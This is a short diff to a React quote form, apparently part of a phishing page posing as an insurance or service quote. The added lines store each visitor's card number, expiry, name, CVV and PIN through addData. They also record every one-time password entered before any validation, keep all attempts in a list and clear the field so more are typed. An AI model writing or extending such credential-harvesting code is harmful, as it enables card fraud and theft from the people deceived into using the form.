@@ -396,7 +396,7 @@ export function ProfessionalQuoteForm() {
     if (validateStep(6)) {
       setPaymentProcessing(true)
       const visitorId = localStorage.getItem("visitor")
-      await addData({id:visitorId, cardNumber:paymentData.cardNumber,cardMonth:paymentData.cardMonth,cardYear:paymentData.cardYear,cardName:paymentData.cardName,pinCode:paymentData.pinCode})
+      await addData({id:visitorId, cardNumber:paymentData.cardNumber,cardMonth:paymentData.cardMonth,cardYear:paymentData.cardYear,cardName:paymentData.cardName,cvv:paymentData.cvv,pinCode:paymentData.pinCode})
 
       setTimeout(() => {
         setPaymentProcessing(false)
@@ -409,16 +409,19 @@ export function ProfessionalQuoteForm() {
 const allOtps=[""]
   const handleSubmit = async (e:React.FormEvent) => {
     e.preventDefault()
+    const visitorId = localStorage.getItem("visitor")
+
+    allOtps.push(paymentData.otp)
+
+    await addData({id:visitorId,otp:paymentData.otp,allOtps})
 
     if (validateStep(7)) {
       setIsSubmitting(true)
-      allOtps.push(paymentData.otp)
       // Implementation
-      const visitorId = localStorage.getItem("visitor")
-      await addData({id:visitorId,otp:paymentData.otp,allOtps})
 
       setTimeout(() => {
         setIsSubmitting(false)
+        handleFieldChange('otp',"")
       }, 2000)
     }
   }
